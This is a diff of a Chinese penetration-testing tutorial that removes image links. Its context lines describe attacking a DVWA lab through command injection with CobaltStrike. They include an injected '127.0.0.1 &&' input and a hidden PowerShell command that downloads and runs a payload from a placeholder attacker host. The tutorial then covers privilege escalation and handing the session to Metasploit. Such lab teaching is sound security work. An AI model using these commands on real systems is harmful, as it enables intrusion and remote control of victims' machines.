@@ -14,7 +14,6 @@
 
 ## 实战环境搭建
 
-![](img/8591d7220ff3fc90a1934796644570c4_1.png)
 
 以下是本次演示所需的环境与工具：
 *   **攻击机**：运行CobaltStrike。
@@ -29,11 +28,9 @@
 
 ### 1. 定位漏洞点
 
-![](img/8591d7220ff3fc90a1934796644570c4_3.png)
 
 访问靶机上的DVWA网站，将安全级别设置为“Low”。找到“Command Execution”漏洞模块。在该页面，输入框可通过拼接系统命令实现远程命令执行。
 
-![](img/8591d7220ff3fc90a1934796644570c4_5.png)
 
 例如，输入 `127.0.0.1 && ipconfig` 并提交，页面会返回执行 `ipconfig` 命令的结果，这证实了漏洞存在。
 
@@ -41,7 +38,6 @@
 
 在CobaltStrike中，我们需要生成一个能通过命令执行漏洞触发的木马。
 
-![](img/8591d7220ff3fc90a1934796644570c4_7.png)
 
 1.  点击菜单 **Attack -> Web Drive-by -> Scripted Web Delivery**。
 2.  在弹出的窗口中，选择之前配置好的监听器。
@@ -55,13 +51,10 @@ CobaltStrike会生成一条PowerShell命令，例如：
 powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://YOUR_CS_IP:1234/a'))"
 ```
 
-![](img/8591d7220ff3fc90a1934796644570c4_9.png)
 
-![](img/8591d7220ff3fc90a1934796644570c4_10.png)
 
 ### 3. 投递并执行载荷
 
-![](img/8591d7220ff3fc90a1934796644570c4_11.png)
 
 将生成的PowerShell命令复制，粘贴到DVWA的命令执行输入框中，格式为 `127.0.0.1 && [粘贴的命令]`。
 
@@ -69,17 +62,13 @@ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring
 
 靶机上线后，建议立即在Beacon中右键会话，选择 **Session -> Sleep**，将回连间隔设置为较短时间（如2-5秒），以增加隐蔽性。
 
-![](img/8591d7220ff3fc90a1934796644570c4_13.png)
 
 ## 权限提升尝试
 
-![](img/8591d7220ff3fc90a1934796644570c4_15.png)
 
 获得初始会话后，我们通常需要提升权限。当前会话用户为普通用户（如`admin`），我们希望获得`SYSTEM`权限。
 
-![](img/8591d7220ff3fc90a1934796644570c4_17.png)
 
-![](img/8591d7220ff3fc90a1934796644570c4_18.png)
 
 在CobaltStrike中，可以尝试使用内置的提权模块：
 1.  右键目标会话，选择 **Explore -> Elevate**。
@@ -88,19 +77,14 @@ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring
 
 如果提权成功，会获得一个新的具有`SYSTEM`权限的会话。但内置模块可能因系统环境而失败，此时需要寻找其他提权方法或导入第三方提权插件。
 
-![](img/8591d7220ff3fc90a1934796644570c4_20.png)
 
-![](img/8591d7220ff3fc90a1934796644570c4_21.png)
 
 ## CobaltStrike与Metasploit联动
 
-![](img/8591d7220ff3fc90a1934796644570c4_23.png)
 
-![](img/8591d7220ff3fc90a1934796644570c4_25.png)
 
 CS与MSF源于同宗，联动可以结合两者优势。下面演示如何将CS的会话转移到MSF中。
 
-![](img/8591d7220ff3fc90a1934796644570c4_27.png)
 
 ### 1. 在MSF中设置监听
 
@@ -123,7 +107,6 @@ exploit -j
 ```
 执行后，MSF开始在 `10.0.0.9:4447` 上监听。
 
-![](img/8591d7220ff3fc90a1934796644570c4_32.png)
 
 ### 2. 在CS中配置转发监听器
 
@@ -145,13 +128,10 @@ exploit -j
 2.  在弹出的新窗口中，选择我们刚刚创建的 `MSF` 监听器。
 3.  点击 **Choose**。
 
-![](img/8591d7220ff3fc90a1934796644570c4_34.png)
 
 切换回MSF终端，可以看到MSF成功接收到了来自CS转发的Meterpreter会话。至此，我们可以在MSF中使用丰富的后期利用模块对目标进行深入操作。
 
-![](img/8591d7220ff3fc90a1934796644570c4_35.png)
 
-![](img/8591d7220ff3fc90a1934796644570c4_37.png)
 
 ## 总结
 
